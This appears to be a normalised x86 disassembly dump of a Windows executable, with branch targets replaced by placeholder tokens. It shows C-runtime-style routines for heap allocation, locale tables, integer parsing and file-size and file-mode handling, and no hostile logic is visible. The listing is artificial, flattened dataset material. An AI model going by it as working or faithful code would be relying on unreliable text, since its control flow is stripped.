lea eax [ ebp - 0x10 ]
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_409812
push [ ebp - 0x8 ]
call sub_409812
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_4130b8
push ebx
call sub_409812
push [ ebp - 0x8 ]
call sub_409812
push [ ebp - 0x4 ]
call sub_409812
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_409812
push [ esi + 0xb0 ]
call sub_409812
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_413574
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_4078ae
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rwxdata ] 0x0
je r-xdata
push esi
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_40a0e1
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_4135f6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_409ff1
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_409812
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_40a0e1
pop ecx
call sub_4078ae
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rwxdata ] eax
je r-xdata
pop edi
call sub_4078ae
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40786c
pop ecx
mov [ esi ] eax
push esi
call sub_40a0e1
pop ecx
test eax eax
je r-xdata
call sub_4078ae
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40786c
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_4136a3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4135f6
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_410fb8
pop ecx
mov ebx eax
call sub_4078ae
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_40c890
add esp 0xc
sub_413711
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_408ec3
push eax
call sub_40b50c
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_407dff
add eax 0x20
cmp esi eax
jne r-xdata
call sub_407dff
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rwxdata ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rwxdata ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_40c01b
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_4137ad
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_408ee9
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_4137e1
push 0x10
push r--data
call sub_408380
call sub_407dff
lea esi [ eax + 0x20 ]
mov [ ebp - 0x1c ] esi
xor eax eax
cmp [ ebp + 0xc ] eax
setne al
test eax eax
jne r-xdata
push esi
call sub_407ed6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_413711
mov edi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
push esi
push edi
call sub_4137ad
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41385e
mov eax [ ebp - 0x20 ]
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
call sub_4083c5
retn
sub_413911
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_40c01b
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_40c060
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_40c060
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_40c060
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_40c060
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_411672
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_409812
push [ ebp - 0x1c ]
call sub_409812
push [ ebp - 0x20 ]
call sub_409812
push [ ebp - 0x28 ]
call sub_409812
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_409812
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_4121cc
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_41209f
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_41209f
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_4090d0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_4090d0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_4090d0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_409812
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_409812
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_409812
push [ esi + 0xc0 ]
call sub_409812
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_413d6f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_413de3
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_413e9d
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_406900
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_41a46c
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_4078ae
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_4140c8
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rwxdata ] eax
jne r-xdata
push eax
push rwxdata
jmp r-xdata
call sub_413e9d
add esp 0x14
pop ebp
retn
sub_414110
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rwxdata
jmp r-xdata
call sub_413e9d
add esp 0x14
pop ebp
retn
sub_414159
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_40b354
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_4078ae
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_40b354
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40b354
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b354
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_414412
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_4078ae
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_40fef2
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_4078ae
mov [ eax ] 0xd
call sub_4078c1
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_4078c1
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_4078ae
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4086f2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_414412
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_41430f
push 0x10
push r--data
call sub_408380
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4078c1
and [ eax ] 0x0
push 0x9
pop eax
jmp r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
push 0x9
pop esi
mov [ eax ] esi
cmp ebx [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
jl r-xdata
call sub_4078ae
push 0x9
pop esi
mov [ eax ] esi
mov [ ebp - 0x1c ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_414159
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
push 0x16
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4143ee
mov eax [ ebp - 0x1c ]
call sub_407823
mov eax esi
jmp r-xdata
sub_4143f6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_41430f
add esp 0xc
neg eax
sbb eax eax
pop ebp
retn
sub_414412
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rwxdata ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_4144cd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
push eax
push rwxdata
call [ InterlockedExchange@IAT ]
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
push 0x16
pop eax
pop ebp
retn
sub_41450f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
push 0x16
pop eax
pop ebp
retn
sub_41453c
push 0x10
push r--data
call sub_408380
mov eax [ ebp + 0xc ]
cmp eax 0x4000
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
cmp eax 0x8000
je r-xdata
test ebx ebx
js r-xdata
call sub_4078ae
mov [ eax ] 0x9
jmp r-xdata
cmp eax 0x10000
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
